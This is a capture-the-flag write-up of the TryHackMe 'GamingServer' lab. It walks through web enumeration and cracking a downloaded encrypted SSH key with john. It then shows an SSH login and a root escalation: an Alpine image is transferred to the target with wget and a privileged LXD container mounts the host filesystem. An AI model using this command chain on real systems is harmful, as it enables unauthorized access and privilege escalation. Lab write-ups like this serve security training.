---
layout: post
current: post
cover: 'assets/images/gamingserver/cover.jpeg'
navigation: True
title: GamingServer Write Up
date: 2020-09-06 00:00:00
tags: [tryhackme, ctf, oscp]
class: post-template
subclass: 'post'
author: darryn
---
![GamingServer](/assets/images/gamingserver/gamingserver.png)

### Overview

GamingServer is an easy Boot2Root machine from [TryHackMe](https://tryhackme.com) with 2 flags available 'user.txt' and 'root.txt'.

### Nmap

TryHackMe will assign a dynamic IP as part of the deployment, the IP I will be targeting is '10.10.100.235'. I start by doing an nmap scan to check what ports are open.

```highlight
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #nmap -sC -sV -oA nmap/initial 10.10.100.235
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-06 14:40 BST
Nmap scan report for 10.10.100.235
Host is up (0.026s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
```

Two ports, 22 and 80. I will look at port 80 first.

### Enumeration

Port 80 brings us to a simple web page, while I look around the website I started a Gobuster in the background. 

```highlight
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #gobuster dir -u http://10.10.100.235 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.100.235
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/06 14:45:50 Starting gobuster
===============================================================
/uploads (Status: 301)
/secret (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/06 14:48:03 Finished
===============================================================
```

Looking at the source I do see a comment aimed at someone called 'john', could be a possible username.

> john, please add some actual content to the site! lorem ipsum is horrible to look at.

![source](/assets/images/gamingserver/source.png)

On the DRAAGAN LORE page is a link to 'uploads' which redirects to a directory. 

![draaganlore](/assets/images/gamingserver/draaganlore.png)

The directory contains 3 files.

![uploads](/assets/images/gamingserver/uploads.png)

Using wget I downloaded each one. 

```highlight                                                                              
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #wget http://10.10.100.235/uploads/dict.lst
--2020-09-06 14:50:33--  http://10.10.100.235/uploads/dict.lst
Connecting to 10.10.100.235:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2006 (2.0K)
Saving to: ‘dict.lst’

dict.lst                              100%[========================================================================>]   1.96K  --.-KB/s    in 0s   

2020-09-06 14:50:33 (229 MB/s) - ‘dict.lst’ saved [2006/2006]

┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #wget http://10.10.100.235/uploads/manifesto.txt
--2020-09-06 14:50:52--  http://10.10.100.235/uploads/manifesto.txt
Connecting to 10.10.100.235:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3070 (3.0K) [text/plain]
Saving to: ‘manifesto.txt’

manifesto.txt                         100%[========================================================================>]   3.00K  --.-KB/s    in 0s   

2020-09-06 14:50:52 (530 MB/s) - ‘manifesto.txt’ saved [3070/3070]

┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #wget http://10.10.100.235/uploads/meme.jpg
--2020-09-06 14:51:09--  http://10.10.100.235/uploads/meme.jpg
Connecting to 10.10.100.235:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15457 (15K) [image/jpeg]
Saving to: ‘meme.jpg’

meme.jpg                              100%[========================================================================>]  15.09K  --.-KB/s    in 0.02s

2020-09-06 14:51:09 (679 KB/s) - ‘meme.jpg’ saved [15457/15457]

┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #
```

Looking at each file:

* dict.lst - Appears to be a list of passwords
* manifesto.txt - Is a copy of 'The Hacker Manifesto' by The Mentor from January 8 1986
* meme.jpg - Is an image of a muppet

The dict.lst could be useful, looking back at the Gobuster output is a /secret directory. 

![secret](/assets/images/gamingserver/secret.png)

Inside is a SecretKey. Again I will download with wget.

```highlight 
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]                                                                                     
└──╼ #wget http://10.10.100.235/secret/secretKey                                                                                                 
--2020-09-06 14:50:07--  http://10.10.100.235/secret/secretKey                                                                                   
Connecting to 10.10.100.235:80... connected.                                                                                                     
HTTP request sent, awaiting response... 200 OK                                                                                                   
Length: 1766 (1.7K)                                                                                                                              
Saving to: ‘secretKey’                                                                                                                           
                                                                                                                                                 
secretKey                             100%[========================================================================>]   1.72K  --.-KB/s    in 0s 
                                                                                                                                                 
2020-09-06 14:52:07 (223 MB/s) - ‘secretKey’ saved [1766/1766]   
```

Great it looks like a encrypted SSH id_rsa key, lets use the password list from the upload folder to crack.

```highlight 
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #cat secretKey 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
<<SNIP>>
```

I used the ssh2john Python script to extract the password hash from the key file.

```highlight
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #/usr/share/john/ssh2john.py secretKey > cracked
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #cat cracked 
secretKey:$sshng$1$16$82823EE792E75948EE2DE731AF1A0547$1200$4fbf85fb78a59b915c159c76e269ebba0318e39e6f238eb5ce231be0d624f58255e6ec1caf1e107e53f6436564f
298711f83fe3cb6fbf6709cd12ac138f065074577a632c96dfda129b65acc52edab816366aeba68b2c8af6751c3be0ccc748c1739c523b8ecc581703d4a99b64cf9b13717d5a7dc87e214e7
f21de334d3b023bcaaab3aaafe5090c5d51acefb1769122da7f1d2625d72ebbfe5a477363355b65b8a672897227b245e20b4d7e627864aa3978232edf1339f6a999ca28f54fbfcf739440a3
1114b2b1b50a61c7271649c1d43c2e244c43fdeac64622c160e1ae31ab5cf84a1a80a906a52666e05b5c20e22bc317b20a1237daf26cf56f773d4a8732008919712963bfc834c5106a10dfd
f09e5561042d745161fda6220eba934d4a48d26eb2313a058984872913d04b5541389dd00c8b7b74e4c635534928effbef8739dd79971685527749d708031e20ff90ff62a70bb6dfed29b2f
2bb2820936dcdceeb299db530656a28e5fbe0fa312046e77dd2ce1d0d630451119d0765adc3bb982458638a3c3cb70f16c1a3c71d0798b4782bb708660bf80b8f583102ae77d900209971a8
6b35dddc878546d181ebe1cb0e5f15443cf5ff889985a7c30b682284a7963a398b87cdd0a8ac1ae2cd57201e8128f652fce83233844c9cddee666bf5ac33cbfb4cb3b7a03904710d5df90d7
c5591590c6f2ad8869522e6cb03cfe4e1e7bf49b36f5e901b412cd453e5c615721edfd62a569565f4ddac99de4e7f14bb7bd9f363057fe7af6dd30f64cc7d5dcdc8c7bfe115e23109da0c37
88baf01a1915005ca0968eb9f9cb9130b4847c4ded3fedfd0bdc688b1648559d830c276056899dc1de123eddd619e6b008a26fbf437f2dfce3f9678d932d5f5357204821cd08f981af13167
1def2e983371e42ab91a960dd4152d7d6158aad906727bf32d224cd3b44082a03e48f018f250a75def2037e36fffdfbffbfba279f785b4e9aba435369117ebf49859631f5390bc13a8e3f45
<<SNIP>>
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #
```

Now with the hash I can use john to crack.

```highlight
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #john cracked -w dict.lst 
Warning: only loading hashes of type "SSH", but also saw type "tripcode"
Use the "--format=tripcode" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
{{REDACTED}}          (secretKey)
1g 0:00:00:00 DONE (2020-09-06 15:20) 100.0g/s 354600p/s 354600c/s 354600C/s 1701d..sss
Session completed
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #
```

It doesn't take long to crack. Using the key and password I should be able to SSH in to the machine. However, I dont know the username, going back to the HTML comment earlier, I will try with the username 'john'. First I need to chmod 600 the key file before I can use it.

```highlight
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #chmod 600 secretKey 
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #ssh -i secretKey john@10.10.100.235
The authenticity of host '10.10.100.235 (10.10.100.235)' can't be established.
ECDSA key fingerprint is SHA256:LO5bYqjXqLnB39jxUzFMiOaZ1YnyFGGXUmf1edL6R9o.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.100.235' (ECDSA) to the list of known hosts.
Enter passphrase for key 'secretKey': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Sep  6 14:23:42 UTC 2020

  System load:  0.0               Processes:           96
  Usage of /:   41.3% of 9.78GB   Users logged in:     0
  Memory usage: 40%               IP address for eth0: 10.10.100.235
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ 
```

Im in! Lets grab the first flag.

```highlight
john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt
a5c2ff8b9c2e{{REDACTED}}
john@exploitable:~$ 
```

### Privilege Escalation

Now on to the root flag. Doing the command 'id' shows John is part of many groups including 'sudo' and 'lxd'. I tried 'sudo -l' but as I don't have John's password I cant run any commands as sudo.

```highlight
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
john@exploitable:~$ sudo -l
[sudo] password for john: 
Sorry, try again.
[sudo] password for john: 
Sorry, try again.
[sudo] password for john: 
sudo: 3 incorrect password attempts
john@exploitable:~$ 
```

However, lxd is interesting. LXD is a Linux container system. Googling 'lxd privesc' led me to an [article](https://www.hackingarticles.in/lxd-privilege-escalation/) with a overview of LXD, LXC and container technology. Also a step my step guide on how to use LXD to gain root privilege to the host machine.

First I use git clone to download the alpine builder. Once downloaded I ran the build script.

```highlight
┌─[✗]─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #git clone  https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 27, done.
remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27
Receiving objects: 100% (27/27), 16.00 KiB | 199.00 KiB/s, done.
Resolving deltas: 100% (6/6), done.
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer]
└──╼ #cd lxd-alpine-builder
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer/lxd-alpine-builder]
└──╼ #sudo ./build-alpine
Determining the latest release... v3.12
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.12/main/x86_64
Downloading alpine-mirrors-3.5.10-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading alpine-keys-2.2-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading apk-tools-static-2.10.5-r1.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: OK
Verified OK
Selecting mirror http://mirror1.hs-esslingen.de/pub/Mirrors/alpine/v3.12/main
fetch http://mirror1.hs-esslingen.de/pub/Mirrors/alpine/v3.12/main/x86_64/APKINDEX.tar.gz
(1/19) Installing musl (1.1.24-r9)
(2/19) Installing busybox (1.31.1-r19)
Executing busybox-1.31.1-r19.post-install
(3/19) Installing alpine-baselayout (3.2.0-r7)
Executing alpine-baselayout-3.2.0-r7.pre-install
Executing alpine-baselayout-3.2.0-r7.post-install
(4/19) Installing openrc (0.42.1-r11)
Executing openrc-0.42.1-r11.post-install
(5/19) Installing alpine-conf (3.9.0-r1)
(6/19) Installing libcrypto1.1 (1.1.1g-r0)
(7/19) Installing libssl1.1 (1.1.1g-r0)
(8/19) Installing ca-certificates-bundle (20191127-r4)
(9/19) Installing libtls-standalone (2.9.1-r1)
(10/19) Installing ssl_client (1.31.1-r19)
(11/19) Installing zlib (1.2.11-r3)
(12/19) Installing apk-tools (2.10.5-r1)
(13/19) Installing busybox-suid (1.31.1-r19)
(14/19) Installing busybox-initscripts (3.2-r2)
Executing busybox-initscripts-3.2-r2.post-install
(15/19) Installing scanelf (1.2.6-r0)
(16/19) Installing musl-utils (1.1.24-r9)
(17/19) Installing libc-utils (0.7.2-r3)
(18/19) Installing alpine-keys (2.2-r0)
(19/19) Installing alpine-base (3.12.0-r0)
Executing busybox-1.31.1-r19.trigger
OK: 8 MiB in 19 packages
```

I now have a .tar.gz file I can copy on to the victim machine.

```highlight
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer/lxd-alpine-builder]
└──╼ #ls
alpine-v3.12-x86_64-20200906_1552.tar.gz  build-alpine  LICENSE  README.md
```

Using Python3 I started a http server.

```highlight
┌─[root@parrot]─[/home/daz/Documents/TryHackMe/GamingServer/lxd-alpine-builder]
└──╼ #python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Back on the victim machine, I use wget to download the file.

```highlight
john@exploitable:~$ cd /tmp
john@exploitable:/tmp$ wget http://10.8.21.217/alpine-v3.12-x86_64-20200906_1552.tar.gz
--2020-09-06 14:55:47--  http://10.8.21.217/alpine-v3.12-x86_64-20200906_1552.tar.gz
Connecting to 10.8.21.217:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3109382 (3.0M) [application/gzip]
Saving to: ‘alpine-v3.12-x86_64-20200906_1552.tar.gz’

alpine-v3.12-x86_64-20200906_1552.tar 100%[========================================================================>]   2.96M  1.01MB/s    in 2.9s

2020-09-06 14:55:50 (1.01 MB/s) - ‘alpine-v3.12-x86_64-20200906_1552.tar.gz’ saved [3109382/3109382]

john@exploitable:/tmp$ 
```

Still following the steps from the article, I import the image and run, mounting the root file system.

```highlight
john@exploitable:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200906_1552.tar.gz --alias myimage
Image imported with fingerprint: 4397c7dce96e22e14f6c108eebaeb629f21273dd5a7791754ad0a082c026b09c
john@exploitable:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myimage | 4397c7dce96e | no     | alpine v3.12 (20200906_15:52) | x86_64 | 2.97MB | Sep 6, 2020 at 2:56pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:/tmp$ lxc start ignite
john@exploitable:/tmp$ lxc exec ignite /bin/sh
id~ # id
uid=0(root) gid=0(root)
~ # cd /mnt/root/root/
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt 
2e337b8c9f3a{{REDACTED}}
/mnt/root/root # 
```

We have the root flag! Thank you for reading.
